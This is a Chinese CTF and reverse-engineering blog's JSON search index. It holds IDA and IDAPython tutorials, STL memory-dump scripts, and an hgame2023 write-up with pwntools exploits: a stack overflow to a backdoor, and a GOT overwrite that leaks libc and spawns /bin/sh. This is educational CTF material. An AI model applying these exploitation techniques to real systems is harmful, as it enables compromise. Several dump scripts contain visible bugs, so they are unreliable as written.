{"meta":{"title":"Pa1r0t","subtitle":"re&crypto","description":"welcome to my bolg","author":"Pa1r0t_9e","url":"https://pa1r0t.github.io","root":"/"},"pages":[{"title":"标签","date":"2022-11-06T05:26:24.000Z","updated":"2022-11-07T02:00:45.230Z","comments":true,"path":"tags/index.html","permalink":"https://pa1r0t.github.io/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2022-11-07T03:32:11.000Z","updated":"2022-11-07T03:38:36.970Z","comments":true,"path":"about/index.html","permalink":"https://pa1r0t.github.io/about/index.html","excerpt":"","text":"介绍大家好，我是Pa1r0t 在下末流二本在读，喜欢吹牛睡觉发呆 当然偶尔打打ctf 专业兴趣在安卓逆向 不过以后行情不好的话可能会考虑继续深造，大家如果喜欢我的文章，请保持关注嘤"},{"title":"ctf介绍","date":"2022-11-08T08:19:16.000Z","updated":"2022-11-08T08:42:09.043Z","comments":true,"path":"ctf/ctf.html","permalink":"https://pa1r0t.github.io/ctf/ctf.html","excerpt":"CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。","text":"CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。 CTF竞赛模式具体分为以下三类： 一、解题模式（Jeopardy） 在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。 二、攻防模式（Attack-Defense） 在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 [1] 三、混合模式（Mix） 结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。"},{"title":"ctf","date":"2022-11-07T10:06:36.000Z","updated":"2022-11-07T10:08:24.873Z","comments":true,"path":"categories/ctf.html","permalink":"https://pa1r0t.github.io/categories/ctf.html","excerpt":"什么是CTF?下面我们对课程进行一个内容的讲解。","text":"什么是CTF?下面我们对课程进行一个内容的讲解。 在讲解之前我们首先来对ctf进行对应讲解，ctf是当前1种非常流行的信息安全竞赛形式，其英文名可翻译为夺得flag，也可翻译为夺旗赛。其大体流程是参赛团队之间通过攻防对抗程序分析等形式，首先从主办方给出的比赛环境中获得一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而得的对应分数，为了方便称呼，我们把这样的内容称之为flag，当然在ctf比赛当中涉及内容非常繁杂，我们需要利用，所有可以利用的方，法获得对应的flag，以上就是咱们ctf这样一个比赛形式。"},{"title":"categories","date":"2022-11-06T05:27:18.000Z","updated":"2022-11-07T03:30:48.209Z","comments":true,"path":"categories/index.html","permalink":"https://pa1r0t.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-11-08T07:12:37.000Z","updated":"2023-01-08T12:00:55.893Z","comments":true,"path":"links/index.html","permalink":"https://pa1r0t.github.io/links/index.html","excerpt":"","text":".links-content{ margin-top:1rem; } .link-navigation::after { content: \" \"; display: block; clear: both; } .card { width: 30%; font-size: 1rem; padding: 10px 20px; border-radius: 4px; transition-duration: 0.15s; margin-bottom: 1rem; display:flex; } .card:nth-child(odd) { float: left; } .card:nth-child(even) { float: right; } .card:hover { transform: scale(1.1); box-shadow: 0 2px 6px 0 rgba(0, 0, 0, 0.12), 0 0 6px 0 rgba(0, 0, 0, 0.04); } .card a { border:none; } .card .ava { width: 3rem!important; height: 3rem!important; margin:0!important; margin-right: 1em!important; border-radius:4px; } .card .card-header { font-style: italic; overflow: hidden; width: 100%; } .card .card-header a { font-style: normal; color: #2bbc8a; font-weight: bold; text-decoration: none; } .card .card-header a:hover { color: #d480aa; text-decoration: none; } .card .card-header .info { font-style:normal; color:#a3a3a3; font-size:14px; min-width: 0; overflow: hidden; white-space: nowrap; } CtfStar’s blog 励志做安全研究员 越行勤's Blog 努力学习的小菜鸟"}],"posts":[{"title":"IDA结构体分析","slug":"IDA结构体分析","date":"2023-01-21T01:52:17.000Z","updated":"2023-01-21T05:35:07.011Z","comments":true,"path":"2023/01/21/IDA结构体分析/","link":"","permalink":"https://pa1r0t.github.io/2023/01/21/IDA%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90/","excerpt":"IDA 类型修复","text":"IDA 类型修复 源码编译成二进制代码的过程中，大量辅助信息被删除，其中最重要的就是类型信息 为什么要修复伪代码中的类型？ 提高伪代码的准确度 指导 IDA 反编译器中的优化器使用正确的优化方案 让 IDA 生成的伪代码更接近源码 我们需要手动修复哪些类型？ 函数返回值类型 参数类型 &#x2F; 局部变量类型 &#x2F; 全局变量类型 数组类型 &#x2F; 数组大小 结构体类型 虚表类型 IDA 数组修复主要有两种： 1.局部变量中定义的数组 2.全局变量中定义的数组 数组修复要考虑：数据类型 + 数组大小 IDA 修复枚举值实验材料：ptrace1 IDA 的类型数据库内置了常见的枚举（宏）的值，可以直接引入并修复。 通过逆向分析，ptrace函数 第一个参数就是ptrace函数的功能号 鼠标锁定摁M键导入枚举值 Ctrl+F5搜索ptrace关键字 找到后双击即可 下图就全部修复完成了 IDA 结构体修复实验材料：monopoly 这是一个大富翁游戏！ 确定结构体大小： 内存分配可以直接确定结构体大小 memcpy &#x2F; 局部变量偏移差 -&gt; 间接确定 （结构体&#x2F;类局部变量） 这种大多是在栈上 创建相等大小匿名结构体，并将相关变量、参数的类型修改为该结构体 这里看见这个0x70的new函数，直接在struct视图下创建结构体 快捷键是Shift + F9，打开struct视图 这里在struct视图下，右键点击增加结构体类型 这里可以看见结构体大小 鼠标光标在ends处，增加属性（大小）：摁d键 这里直到sizeof显示为0x70为止，每个属性先以dq为单位，进行存储，后续再逆向分析再进行变更 这样结构体就初步设置完成了 这里回到代码处，这里将v0的类型修改为，刚刚我们创建的结构体类型 第一种改法：摁Y键，进行类型修改为struc_1 *类型 第二种改法：摁右键，转化为其他结构体： 这里直接选择我们刚刚创建的类型即可 这里创建好之后，执行下面的函数，我们跟进去看看 这里的a1进行了一系列操作，我们将a1的类修修改为我们定义的类型 因为这个函数在new之后执行，所以可能是构造函数，这里我们改个函数名吧 在构造函数中，有些属性是进行dword操作，这里我们就要将qword，改成dword类型 比如field_48，这里双击field_48进入结构体定义处，将该属性改成dword，这里摁d键 设置好之后下面未定义的也需要改成dword，就像这样 其他变量也是一样修改，把剩下的也修改了，但是当最后一个属性改为dword后，总大小发生了改变，这里我们只需要在下面再增加一个变量即可 最后就是这样 然后在源码中摁F5，代码就好看多了 上面循环处field_4c是以4字节进行访问，并且访问5词，也就是说field_4c开始处是一个以4字节为单位的一个数组，数组大小为5，在结构体定义处，右键点array设置数组，大小为5 最终field_4c后面的变量也将合并进入数组中 源码舒服，重命名为array1 这里进行字符串的初始化和赋值操作 这里我们将field_20改为str1 根据大富翁游戏，初始化的字符串，根据名字都是一些建筑，我们可以把定义的结构体名称改成house，然后将构造函数改成init_house 然后经过构造函数，申请到的对象内存都会存放到，以A1C0为首的地址处 上面一共64个位置，所以类型为house *为类型，数组长度为64个来存放house对象的指针 这里再右键array改为64 这些建筑正好形成地图，将数组名改成map即可 分析另外一个结构体，这个结构体没有使用 new &#x2F; malloc 分配内存，如何确定大小？ 进入函数，看起来明显是个初始化函数 两个变量都是紧挨着的在内存中，属于静态分配了 两个变量位置相减为0x80，所以我们就暂时确定这个结构体的大小为0x80，然后我就去struct视图中去创建一个大小为0x80的结构体，还是老操作 这里其实可以先创建64长度的数组，然后再取消定义，这样就可以快速创建结构体了","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"STL逆向","slug":"std逆向","date":"2023-01-20T12:03:08.000Z","updated":"2023-01-20T12:47:25.636Z","comments":true,"path":"2023/01/20/std逆向/","link":"","permalink":"https://pa1r0t.github.io/2023/01/20/std%E9%80%86%E5%90%91/","excerpt":"c++ STL","text":"c++ STL STL 逆向方法论 识别 STL 容器类型 识别 STL 容器操作 提取 STL 容器中的数据 逆向 STL 主要的问题: 缺少符号，无法判断 STL 容器类型 （主要困难） STL 内部数据结构复杂，难以提取数据 优化使大量 stl 函数被 inline 方法：解析 STL 容器内存数据，从内存数据角度判断容器类型，提取容器内容判断函数操作。 常见 STL 容器序列容器 vector Deque List String 关联容器 Pair Map Set MultiMap &#x2F; MultiSet 无序关联容器:unordered_map C++ STL关联式容器是什么？此类容器在存储元素值的同时，还会为各元素额外再配备一个值（又称为“键”，其本质也是一个 C++ 基础数据类型或自定义类型的元素），它的功能是在使用关联式容器的过程中，如果已知目标元素的键的值，则直接通过该键就可以找到目标元素，而无需再通过遍历整个容器的方式。 弃用序列式容器，转而选用关联式容器存储元素，往往就是看中了关联式容器可以快速查找、读取或者删除所存储的元素，同时该类型容器插入元素的效率也比序列式容器高。 常见 STL 容器适配器容器适配器是一个封装了序列容器的类模板，它在一般序列容器的基础上提供了一些不同的功能。之所以称作适配器类，是因为它可以通过适配容器现有的接口来提供不同的功能。 其实，容器适配器中的“适配器”，和生活中常见的电源适配器中“适配器”的含义非常接近。我们知道，无论是电脑、手机还是其它电器，充电时都无法直接使用 220V 的交流电，为了方便用户使用，各个电器厂商都会提供一个适用于自己产品的电源线，它可以将 220V 的交流电转换成适合电器使用的低压直流电。 从用户的角度看，电源线扮演的角色就是将原本不适用的交流电变得适用，因此其又被称为电源适配器。 举一个例子，假设一个代码模块 A，它的构成如下所示： 1234567class A&#123;public: void f1()&#123;&#125; void f2()&#123;&#125; void f3()&#123;&#125; void f4()&#123;&#125;&#125;; 现在我们需要设计一个模板 B，但发现，其实只需要组合一下模块 A 中的 f1()、f2()、f3()，就可以实现模板 B 需要的功能。其中 f1() 单独使用即可，而 f2() 和 f3() 需要组合起来使用，如下所示： 123456789101112class B&#123;private: A * a;public: void g1()&#123; a-&gt;f1(); &#125; void g2()&#123; a-&gt;f2(); a-&gt;f3(); &#125;&#125;; 可以看到，就如同是电源适配器将不适用的交流电变得适用一样，模板 B 将不适合直接拿来用的模板 A 变得适用了，因此我们可以将模板 B 称为 B 适配器. 容器适配器也是同样的道理，简单的理解容器适配器，其就是将不适用的序列式容器（包括 vector、deque 和 list）变得适用。容器适配器的底层实现和模板 A、B 的关系是完全相同的，即通过封装某个序列式容器，并重新组合该容器中包含的成员函数，使其满足某些特定场景的需要。 stack（STL stack）容器适配器:采用默认的 deque 基础容器 queue容器适配器:其底层使用的基础容器选择默认的 deque 容器 priority_queue ：vector 逆向时处理容器适配器只需要用底层容器来处理即可 STL 各高级类型dump数据std::string 固定长度 32 字节，4 个 dq 第一个指针字段指向数据地址 第二个 size_t 字段存储字符串长度 内存分布： IDA dump脚本： 1234567891011121314def read_dbg_cppstr_64(objectAddr): # a easy function for read std:string # 首地址就是begin指针 strPtr = idc.read_dbg_qword(objectAddr) result = &#x27;&#x27; i = 0 while True: onebyte = idc.read_dbg_byte(strPtr + i) if onebyte == 0: break else: result = chr(onebyte) i += 1 return result std::stringsteam可以看作是读写文件 内存分布： std::vector 固定长度 24 字节，3 个 dq 第一个指针字段指向数组起始地址 第二个指针字段指向数组最后元素地址 第三个指针字段指向最大内存地址 内存分布： IDA dump脚本 12345678def vetor_dump(addr): ELEMENT_SIZE = 8 data_addr = [] vetor_base = idc.read_dbg_qword(addr + 0x0) vetor_end = idc.read_dbg_qword(addr + 0x8) for i in range(vetor_base,vetor_end,ELEMENT_SIZE): data_addr.append(i) return data_addr std::list 双向循环链表存储 头结构 + 节点结构 遍历长度可以用 size 字段确定 内存布局： IDA dump 脚本： 1234567def dump_stl_list(p_list_addr): data_addr = [] list_size = idc.read_dbg_qword(p_list_addr+0x10) cur_node = p_list_addr for i in range(list_size): cur_node = idc.read_dbg_qword(cur_node + 0x0) data_addr.append(cur_node + 0x10) std::deque 头结构 + 迭代器结构 适用 std::deque &#x2F; std::stack stl_deque.start.node 确定first map 项位置 stl_deque.start.last - stl_deque.start.first 确定缓冲区大小 stl_deque.finish.node 确定last map 项位置 对于每一个 map 项： start 项，解析 cur, last 区间 finish 项，解析 start, cur 区间 其余项，解析 start, last 区间 内存布局: IDA dump 脚本: 1234567891011121314151617181920212223242526272829303132deque_iter = namedtuple(&#x27;deque_iter&#x27;,[&#x27;cur&#x27;,&#x27;first&#x27;,&#x27;last&#x27;,&#x27;node&#x27;])def parse_iter(addr): # 解析队列迭代器 cur = idc.read_dbg_qword(addr + 0x0) first = idc.read_dbg_qword(addr + 0x8) last = idc.read_dbg_qword(addr + 0x10) node = idc.read_dbg_qword(addr + 0x18) return deque_iter(cur,first,last,node)def dump_deque(addr): ELEMENT_SIZE = 4 # std::deque&lt;xx&gt; xx 的类型大小来指定 data_addr = [] start_iter = parse_iter(addr + 0x10) finish_iter = parse_iter(addr + 0x30) buf_size = start_iter.last - start_iter.first map_size = start_iter.node map_finish = finish_iter.node # 解析第一个缓存数据 for i in range(start_iter.cur,start_iter.last,ELEMENT_SIZE): data_addr.append(i) # 解析最后一个缓存数据 for i in range(finish_iter.first,finish_iter.cur,ELEMENT_SIZE): data_addr.append(i) # 解析中间缓存数据 for i in range(map_start + 8,map_finish - 8,8): buf_start = idc.read_dbg_qword(b) for i in range(buf_start,buf_start + buf_size, ELEMENT_SIZE): data_addr.append(i) return data_addr std::map 底层采用 Rb-Tree 实现（红黑二叉树） 头结构 + 节点结构 用二叉树遍历可提取数据 适用 std::map &#x2F; std::set &#x2F; std::multimap &#x2F; std::multiset 内存分布： IDA dump 脚本： 123456789101112131415161718192021def parse_gnu_map_header(address): root = idc.read_dbg_qword(address + 0x10) return rootdef parse_gnu_map_node(address): left = idc.read_dbg_qword(address + 0x10) right = idc.read_dbg_dword(address + 0x10) data = address + 0x20 return left, right, datadef parse_gnu_map_travel(address): # address &lt;—— std::map struct address result = [] worklist = [parse_gnu_map_header(address)] while len(worklist) &gt; 0: addr = worklist.pop() (left, right, data) = parse_gnu_map_node(addr) if left &gt; 0: worklist.append(left) if right &gt; 0: worklist.append(right) result.append(data) return result std::unsorted_map 底层采用 HashTable 实现 头结构 + Bucket 数组 + 节点结构 所有节点结构用单链表串联（****dump 只需要遍历单链表） 头结构的第三个字段为单链表头 适用 **std::**unsorted_map **&#x2F; std::**unsorted_set &#x2F; … 内存布局: IDA dump 脚本: 123456789def dump_stl_hashmap(addr): # dump stl hashmap gnu c++ x64 data_addr = [] bucket_addr = idc.read_dbg_qword(addr + 0x10) node_addr = bucket_addr while node_addr != 0: data_addr.append(node_addr + 0x8) node_addr = idc.read_dbg_qword(node_addr) return data_addr std::shared_ptr第一个指针就是数据指针 内存布局： 实战部分","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"Microcode","slug":"Microcode","date":"2023-01-19T14:09:48.000Z","updated":"2023-01-21T05:43:58.826Z","comments":true,"path":"2023/01/19/Microcode/","link":"","permalink":"https://pa1r0t.github.io/2023/01/19/Microcode/","excerpt":"记录Microcode","text":"记录Microcode 介绍Microcode 是 hexrays 内部采用的介于机器代码与伪代码之间的一种中间表示语言(IR)。 Microcode 生成完成后，IDA 在 Microcode 的基础上生成 CTree。 CTree 是 IDA 内部用于表示 C语言伪代码的抽象语法树，IDA 也提供了大量 API 操作 CTree，可以实现一下伪代码展示方面的优化，例如删除某些节点等等。 Microcode 指令格式 opcode left, right, destination一般来说有三个操作数，有一些指令可能缺少某个操作数，destination 也不一定会被修改（Store 指令） Microcode 中常见的数据结构 函数是 IDA 中最大的汇编结果表示单位 函数 → 基本块 → 指令 → 操作数 Microcode 可视化插件 https://github.com/gaasedelen/lucid Ctree 可视化插件https://github.com/patois/HRDevHelper Microcode生成过程： 生成 Microcode 变换 Microcode （例如优化） 局部变量分配 生成 CTree （CTree 是 IDA 用来表示伪代码的抽象语法树 AST） 优化 CTree 输出 CTree Microcode 寄存器 microcode 的寄存器没有数量限制，物理寄存器往往会被直接映射到 microcode 寄存器，例如 AL is mapped into al.1 (mreg number 8) AH is mapped into ah.1 (mreg number 9) EAX is mapped into eax.4 (mreg numbers 8-11) RSI is mapped into rsi.8 Microcode 分阶段生成, 最初阶段生成的代码非常冗余 Microcode 快速上手，手动调用 microcode 生成 1234567891011121314151617181920212223import ida_hexraysimport idaapidef print_microcode(func_ea): maturity = ida_hexrays.MMAT_GLBOPT3 # maturity: # MMAT_ZERO, //&lt; microcode 不存在 # MMAT_GENERATED //&lt; 已经生成的microcode # MMAT_PREOPTIMIED //&lt; 预先优化的pass已完成 # MMAT_LOCOPT //&lt; local 本地每个基本块的优化已完成 control控制流图也就绪 # MMAT_CALLS //&lt; 检测调用参数 # MMAT_GLBOPT1 //&lt; 执行第一个全局优化pass # MMAT_GLBOPT2 //&lt; 大多数全局优化pass已完成 # MMAT_GLBOPT3 //&lt; 完成所有的优化，microcode被修改 # MMAT_LVAR3 //&lt; 分配所有的局部变量 hf = ida_hexrays.hexrays_failure_t() pfn = idaapi.get_func(func_ea) rng = ida_hexrays.mba_ranges_t(pfn) mba = ida_hexrays.gen_microcode(rng,hf,None, ida_hexrays.DECOMP_WARNINGS,maturity) vp = ida_hexrays.vd_printer_t() mba._print(vp)print_microcode(0x1229) Microcode 相关的数据结构，定义在 hexrays.hpp 文件 Microcode 相关的数据结构: mbl_array_t,这个结构用来存放函数的基本块信息 基本块之间使用双向链表链接 基本块数组存放在 natural 数组 Microcode 相关的数据结构: mblock_t,这个结构用来描述基本块信息。±基本块内的指令与指令之间使用双向链表链接 Microcode 相关的数据结构: minsn_t。用于描述指令信息的结构。（注意微码指令支持指令嵌套。） Microcode 相关的数据结构: mop_t 用于描述操作数信息的结构，指令 minsn_t 有 0 ~ 3 个操作数，分别时 l (left), r (right), d (destination) 操作数的类型用 mop_t 来表示 Microcode 插件例子 实现 svc 0x900001 与 svc 0x9000F8 指令反编译成一条 call 指令 install_microcode_filter 注册 microcode filter 实现拦截指令翻译 microcode filter 是一种可以拦截 microcode 指令生成的机制，开发者需要继承 microcode_filter_t 类并实现 match 与 apply 两个函数。 ida 在生成某一条指令的 microcode 之前会调用所有已经注册的 filter 的 match 函数，若 match 函数返回 True，则调用对应的 apply 函数实现指令替换。 我们需要将 svc 指令替换成 call 指令，ida 已经为我们实现了替换类 udc_filter_t, 这个类继承于 microcode_filter_t 并实现了 apply 方法（即替换call指令），我们需要继承 udc_filter_t 并实现它的 match 方法用于判断拦截的指令。 Microcode 插件例子","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"IDAPython","slug":"IDAPython","date":"2023-01-19T09:52:02.000Z","updated":"2023-01-19T10:41:38.027Z","comments":true,"path":"2023/01/19/IDAPython/","link":"","permalink":"https://pa1r0t.github.io/2023/01/19/IDAPython/","excerpt":"记录ida脚本","text":"记录ida脚本 IDA Python 脚本编程内存分为： 本地内存 调试内存 常用脚本接口介绍寄存器操作（调试） 12idc.get_reg_value(&#x27;rax’)idaapi.set_reg_val(&quot;rax&quot;, 1234) 读取 xmm 寄存器 1234def read_xmm_reg(name): rv = idaapi.regval_t() idaapi.get_reg_val(name,rv) return (struct.unpack(&quot;Q&quot;,rv.bytes())[0]) 调试内存操作 dbg 是指debug内存（调试内存） 123456idc.read_dbg_byte(addr)idc.read_dbg_word(addr)idc.read_dbg_dword(addr)idc.read_dbg_qword(addr)idc.read_dbg_memory(addr,size)idc.patch_dbg_byte(addr,val) 调试内存读写封装 123456789def patch_dbg_mem(addr,data): for i in range(len(data)): idc.patch_dbg_byte(addr+i,data[i]) def read_dbg_mem(addr,size): dd = [] for i in range(size): dd.append(idc.read_dbg_byte(addr+i)) return bytes(dd) 本地内存操作（会修改idb数据库） 123456idc.get_qword(addr)idc.patch_qword(addr,val)idc.patch_dword(addr,val)idc.patch_word(addr,val)idc.patch_byte(addr,val)idc.get_bytes(addr,size) 反汇编操作 12idc.GetDisasm(addr) # 只能返回一条汇编指令idc.next_head(addr) # 获取下一条汇编指令的地址 交叉引用分析 12for ref in idautils.XrefsTo(ea): print(hex(ref.frm)) 杂项常用接口 12345idc.add_bpt(addr) # 添加断点idaapi.get_imagebase() # 获取基地址idc.create_insn(addr) # 生成汇编指令，相当于快捷键C 常用于固件分析ida_funcs.add_func(addr) # 生成函数，相当于快捷键pida_bytes.create_strlit(addr) # 生成字符串，相当于快捷键A 函数遍历 12for func in idautils.Functions(): print(&quot;0x%x,%s&quot; % (func,idc.get_func_name(func))) 基本块的遍历 12345678910fn = 目标函数地址f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)for blocks in f_blocks: print(hex(blocks.start_ea)) # 基本块的前驱 for pre in blocks.preds(): print(hex(pre.start_ea)) # 基本块的后继 for sucess in blocks.succs(): print(hex(sucess.start_ea)) 指令遍历 12for ins in idautils.FuncItems(addr): print(hex(ins)) 实战部分ollvm批量断点设置： 实验材料：ollvm-flat 注意：判断真实块的依据是查找 ollvm 汇集点基本块的交叉引用，不一定准确 断点脚本： 123456789101112131415161718import idcimport idaapiimport structimport idautils# ollvm函数地址fn = 0x401F60# ollvm基本块汇集地址ollvm_tail = 0x405D4B# 拿到函数基本块的迭代器f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS)# 然后遍历函数基本块for block in f_blocks: # 拿到每个基本块的后驱 for sucess in block.succs(): if sucess.start_ea == ollvm_tail: print(hex(block.start_ea)) idc.add_bpt(block.start_ea) 复制到ida下面，摁回车两次就行 成功打上断点，打上断点的基本块都是真实块 断点管理 全选右键生成文件夹 点击文件夹，进行断点的批量禁用或启用 条件断点脚本编写： 实验材料：dump_test.exe 目标：设置一个条件断点，当 rand 函数返回值为 16949 时停下 找到random函数 设置断点 在断点处右键编辑断点 脚本： 12345678import idcimport idaapiimport structimport idautilsdef bp(): rax = idc.get_reg_value(&#x27;rax&#x27;) return rax == 16949 先在ida中执行脚本 然后编辑断点，增加condition条件 然后运行程序 程序停下来后，就查看rax寄存器，经过16进制转10进制，结果正确 条件断点运用：dump rand 函数每一次执行结果，不让程序停下来 脚本：条件断点函数返回 False，IDA 不会命中该断点,利用这个特性提取运行时数据 1234def bp(): rax = idc.get_reg_value(&#x27;rax&#x27;) print(rax,end=&#x27;,&#x27;) return False","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]},{"title":"hgame2023","slug":"hgame2023","date":"2023-01-14T02:09:49.000Z","updated":"2023-01-16T12:11:57.172Z","comments":true,"path":"2023/01/14/hgame2023/","link":"","permalink":"https://pa1r0t.github.io/2023/01/14/hgame2023/","excerpt":"复现hgame","text":"复现hgame week1crypto兔兔的车票题目： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from PIL import Imagefrom Crypto.Util.number import *from random import shuffle, randint, getrandbitsflagImg = Image.open(&#x27;flag.png&#x27;)width = flagImg.widthheight = flagImg.heightdef makeSourceImg(): colors = long_to_bytes(getrandbits(width * height * 24))[::-1] #生成图像吧 img = Image.new(&#x27;RGB&#x27;, (width, height)) x = 0 #写像素 for i in range(height): for j in range(width): img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2])) x += 3 return imgdef xorImg(keyImg, sourceImg): # 生成图片 img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return imgn1 = makeSourceImg()n2 = makeSourceImg()n3 = makeSourceImg()nonce = [n1, n2, n3] #三张图片index = list(range(16)) #生成0~16的序列shuffle(index) # 打乱序列e=0&quot;&quot;&quot;这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png&quot;&quot;&quot;for i in index: im = Image.open(f&quot;source/picture&#123;i&#125;.png&quot;) key = nonce[randint(0, 2)] encImg = xorImg(key, im) encImg.save(f&#x27;pics/enc&#123;e&#125;.png&#x27;) e+=1 解法：原先我看着只有enc.png,其他啥都没有，怎么个异或？后来也注意到key只有三个，考虑过重复的情况，但是我发现仅有一个enc.png,还是没法搞出原图，后来看了别人的wp，才知道，只要flag.png^picture.png就行，因为它的picture.png原本的就没啥像素，enc.png大部分还是key的像素，所以找到一张存在flag.png的图片，将key异或掉就行，最终虽然得不到真正得flag.png但模糊程度也不高。这里对16张图片笛卡尔积级别异或就行 最后解密代码： 123456789101112131415161718192021222324252627from PIL import Imagefrom Crypto.Util.number import *from random import shuffle, randint, getrandbitsflagImg = Image.open(f&#x27;pics/enc&#123;0&#125;.png&#x27;)width = flagImg.widthheight = flagImg.heightflagImg.close()def xorImg(keyImg, sourceImg): # 生成图片 img = Image.new(&#x27;RGB&#x27;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return imgfor i in range(16): for j in range(16): imi = Image.open(f&quot;pics/enc&#123;i&#125;.png&quot;) imj = Image.open(f&quot;pics/enc&#123;j&#125;.png&quot;) xorimg = xorImg(imj, imi) xorimg.save(f&#x27;source/xor&#123;i*16+j&#125;.png&#x27;) imi.close() imj.close() 最后获得模糊的flag图片： 神秘的电话题目： 一个疑似base64编码的txt文件 一个播放起来是一个摩斯密码的wav文件 解法： 提取出声音文件的信息： 1morse2ascii morse.wav base64解码： 篱笆一一&gt;栅栏密码；倒着一一&gt;逆序；密匙一一&gt;维吉尼亚密码;北欧神话一一&gt;vidar （这里用morse2ascii计算出的数据多了一些下划线，做法是每一处下划线都去掉一个就行） 最后flag: PWNeasy_overflow他妈的，这道死活搞不出来，看了wp才知道是close函数关闭了标准输出通道。需要在来个报错输出，把结果输出过来 题目没啥好讲的，直接上exp 123456789from pwn import *io = process(&#x27;./vuln&#x27;)# io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267)elf = ELF(&#x27;./vuln&#x27;)# main_addr = elf.sym[&#x27;main&#x27;]back_addr = elf.sym[&#x27;b4ckd0or&#x27;]payload = b&#x27;A&#x27;*16 + p64(0) + p64(back_addr)io.sendline(payload)io.interactive() 运用1&gt;&amp;2将结果从报错信息中输出 choose_the_seat**HINTS:**数组下标的检查好像少了点东西 下标v0没有检查下界 seats在bss段，并只有seats写入。无法进行栈操作 思路：运用负下标进行got表覆盖，用got表泄漏libc的地址 先用vuln函数覆盖exit的地址，防止程序退出，方便下次再次利用 再用setbuf的plt表进行泄漏got地址，再用指定的libc计算基地址 用基地址计算system的地址，再用system的地址覆盖puts的地址，puts地址的旁边正好可以存放binsh的地方，连着binsh一起覆盖了 exp： 123456789101112131415161718192021222324252627282930313233343536from pwn import *io = process(&#x27;./vuln&#x27;)# io = remote(&#x27;week-1.hgame.lwsec.cn&#x27;,30536)context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]context.log_level = &#x27;debug&#x27;def b(): gdb.attach(io) pause()elf = ELF(&quot;./vuln&quot;)libc = ELF(&#x27;./libc-2.31.so&#x27;)vuln_addr = elf.sym[&#x27;vuln&#x27;]sys_libc = libc.sym[&#x27;system&#x27;]libc_setbuf_addr = libc.sym[&#x27;setbuf&#x27;]print(&#x27;setbuf:&#x27;,hex(libc_setbuf_addr))io.sendlineafter(b&#x27;one.&#x27;,str(-6))io.sendafter(b&#x27;your name&#x27;,p64(vuln_addr))print(&quot;vuln&quot;,vuln_addr)b()io.sendlineafter(b&#x27;one.&#x27;,str(-8))io.sendafter(b&#x27;your name&#x27;,b&#x27;\\xd0&#x27;)io.recvuntil(b&#x27;name is &#x27;)setbuf_addr = u64(io.recvuntil(&#x27;Your seat&#x27;).split(b&#x27;\\nYour&#x27;)[0].ljust(8,b&#x27;\\0&#x27;))print(&#x27;addr:&#x27;,hex(setbuf_addr))base_addr = setbuf_addr - libc_setbuf_addrsys_addr = base_addr + sys_libcio.sendlineafter(b&#x27;one.&#x27;,str(-9))payload = b&#x27;/bin/sh\\x00&#x27; + p64(sys_addr)io.sendafter(b&#x27;your name&#x27;,payload)io.interactive() 这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr 下面把d0换成41就行，41就是我们写进去的’A’ 如何这里减去总值： 这里还有一种做法就是写入\\xd0,就是让地址不发生变化，这样计算基地址直接减去sym中找的地址就行，其实这种做法也就方便了一点点 1234io.sendafter(b&#x27;your name&#x27;,b&#x27;\\xd0&#x27;)io.recvuntil(b&#x27;name is &#x27;)setbuf_addr = u64(io.recvuntil(&#x27;Your seat&#x27;).split(b&#x27;\\nYour&#x27;)[0].ljust(8,b&#x27;\\0&#x27;))print(&#x27;addr:&#x27;,hex(setbuf_addr)) binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了 这里有两种做法，一种是从-9这个下标写入binsh的字符串和system的地址，让程序调用puts间接调用sytem函数 